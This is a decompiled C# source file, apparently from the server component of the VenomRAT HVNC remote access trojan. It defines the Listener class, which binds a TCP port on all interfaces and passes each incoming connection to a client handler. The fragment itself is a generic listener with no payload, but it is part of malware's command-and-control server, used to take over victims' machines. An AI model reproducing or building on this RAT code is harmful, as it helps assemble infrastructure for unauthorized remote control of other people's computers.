using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Handle_Packet;

namespace VenomRAT_HVNC.Server.Connection
{
    // Token: 0x02000037 RID: 55
    internal class Listener
    {
        // Token: 0x17000044 RID: 68
        // (get) Token: 0x060001FC RID: 508 RVA: 0x0001B240 File Offset: 0x0001B240
        // (set) Token: 0x060001FD RID: 509 RVA: 0x0001B248 File Offset: 0x0001B248
        private Socket Server { get; set; }

        // Token: 0x060001FE RID: 510 RVA: 0x0001B254 File Offset: 0x0001B254
        public void Connect(object port)
        {
            try
            {
                IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                this.Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 51200,
                    ReceiveBufferSize = 51200
                };
                this.Server.Bind(localEP);
                this.Server.Listen(500);
                new HandleLogs().Addmsg(string.Format("Listenning to: {0}", port), Color.Green);
                this.Server.BeginAccept(new AsyncCallback(this.EndAccept), null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        // Token: 0x060001FF RID: 511 RVA: 0x0001B30C File Offset: 0x0001B30C
        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                new Clients(this.Server.EndAccept(ar));
            }
            catch
            {
            }
            finally
            {
                this.Server.BeginAccept(new AsyncCallback(this.EndAccept), null);
            }
        }
    }
}